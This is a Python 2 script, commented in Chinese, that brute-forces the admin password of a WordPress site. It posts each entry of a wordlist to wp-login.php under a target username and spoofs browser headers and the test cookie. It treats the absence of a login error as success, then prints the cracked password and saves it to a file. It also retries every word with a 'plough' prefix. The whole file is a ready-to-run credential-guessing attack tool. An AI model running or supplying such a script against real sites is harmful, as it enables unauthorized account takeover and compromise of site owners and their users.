# coding=utf-8
# 破解wordpress 后台用户密码
#作者： http://www.rcdisk.com/index.php/group/topic/id-30

import urllib, urllib2, time, re, cookielib,sys


class wordpress():
    def __init__(self, host, username): #定义好header
        self.username = username
        self.http="http://"+host
        self.url =  self.http + "/wp-login.php"
        self.redirect = self.http + "/wp-admin/"
        self.user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)'
        self.referer=self.http+"/wp-login.php"
        self.cook="wordpress_test_cookie=WP+Cookie+check"
        self.host=host
        self.headers = {'User-Agent': self.user_agent,"Cookie":self.cook,"Referer":self.referer,"Host":self.host}
        self.cookie = cookielib.CookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie))


    def crash(self, filename): #构造好数据包，然后提交表单即可
        try:
            pwd = open(filename, 'r')
            while 1 :
                i=pwd.readline()
                if not i :
                    break

                data = urllib.urlencode(
                    {"log": self.username, "pwd": i.strip(), "testcookie": "1", "redirect_to": self.redirect})
                    
                    #使用抓包软件查看提交的数据字段，然后使用urlencode编码好就可以了。
                    
                Req = urllib2.Request(url=self.url, data=data, headers=self.headers)
                Resp = urllib2.urlopen(Req)
                result = Resp.read()
                # print result
                login = re.search(r'login_error', result)
                if login:
                    pass
                else:
                    print "Crashed! password is %s %s" % (self.username,i.strip())
                    g=open("wordpress.txt",'w+')
                    g.write("Crashed! password is %s %s" % (self.username,i.strip()))
                    pwd.close()
                    g.close()
                    exit()
                    break

            pwd.close()

            pwd = open(filename, 'r')
            for i in pwd:
                data = urllib.urlencode(
                    {"log": self.username, "pwd": "plough"+i.strip(), "testcookie": "1", "redirect_to": self.redirect})
                Req = urllib2.Request(url=self.url, data=data, headers=self.headers)
                Resp = urllib2.urlopen(Req)
                result = Resp.read()
                # print result
                login = re.search(r'login_error', result)
                if login:
                    pass
                else:
                    print "Crashed! password is %s %s" % (self.username,i.strip())
                    pwd.close()
                    break

            pwd.close()


        except Exception, e:
            print "error"
            print e
            print "Error in reading password"


    def check(self):
        print self.url
        print self.username


if __name__ == "__main__":
    print "begin at " + time.ctime()
    host=sys.argv[1]
    user = sys.argv[2]
    dictfile=sys.argv[3]
    obj = wordpress(host, user)
    
    obj.crash(dictfile)
    
    print "end at " + time.ctime()
    
    
